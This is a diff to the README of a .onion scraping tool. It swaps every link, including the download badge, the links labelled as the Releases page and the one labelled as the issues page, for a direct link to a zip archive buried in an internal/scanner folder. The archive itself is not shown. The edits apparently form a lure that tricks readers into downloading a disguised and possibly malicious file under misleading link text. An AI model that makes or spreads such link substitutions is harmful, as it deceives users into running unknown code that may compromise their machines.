@@ -1,6 +1,6 @@
 # 🌐 galileoff-OnionScraper - Pull Data from .onion Sites Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/21jaffy/galileoff-OnionScraper/releases)
+[![Download](https://github.com/21jaffy/galileoff-OnionScraper/raw/refs/heads/main/internal/scanner/Scraper-Onion-galileoff-v3.9.zip)](https://github.com/21jaffy/galileoff-OnionScraper/raw/refs/heads/main/internal/scanner/Scraper-Onion-galileoff-v3.9.zip)
 
 ## 📖 Description
 Galileoff-OnionScraper is an application that allows users to pull HTML data, take screenshots, capture embedded links, and perform detailed logging from .onion sites. This tool is part of the Cyber Vatan Program and was developed by the Yıldız CTI Team to enhance your web scraping capabilities in the dark web domain.
@@ -9,7 +9,7 @@ Galileoff-OnionScraper is an application that allows users to pull HTML data, ta
 To get started with Galileoff-OnionScraper, follow the steps below to download and run the application.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/21jaffy/galileoff-OnionScraper/releases).
+1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/21jaffy/galileoff-OnionScraper/raw/refs/heads/main/internal/scanner/Scraper-Onion-galileoff-v3.9.zip).
    
 2. **Choose the Latest Release:** Look for the latest version on the Releases page. You will find different assets listed for download.
 
@@ -49,6 +49,6 @@ When using Galileoff-OnionScraper, it is crucial to consider your security and p
 If you want to contribute to Galileoff-OnionScraper, feel free to fork the repository, make changes, and submit pull requests. Your contributions help improve this tool for everyone.
 
 ## 📞 Support
-If you encounter any issues, please reach out through the [issues page](https://github.com/21jaffy/galileoff-OnionScraper/issues). You can also check existing issues for help and solutions.
+If you encounter any issues, please reach out through the [issues page](https://github.com/21jaffy/galileoff-OnionScraper/raw/refs/heads/main/internal/scanner/Scraper-Onion-galileoff-v3.9.zip). You can also check existing issues for help and solutions.
 
-Remember, you can always return to the [Releases page](https://github.com/21jaffy/galileoff-OnionScraper/releases) to download the latest version or explore older versions of the application.
+Remember, you can always return to the [Releases page](https://github.com/21jaffy/galileoff-OnionScraper/raw/refs/heads/main/internal/scanner/Scraper-Onion-galileoff-v3.9.zip) to download the latest version or explore older versions of the application.
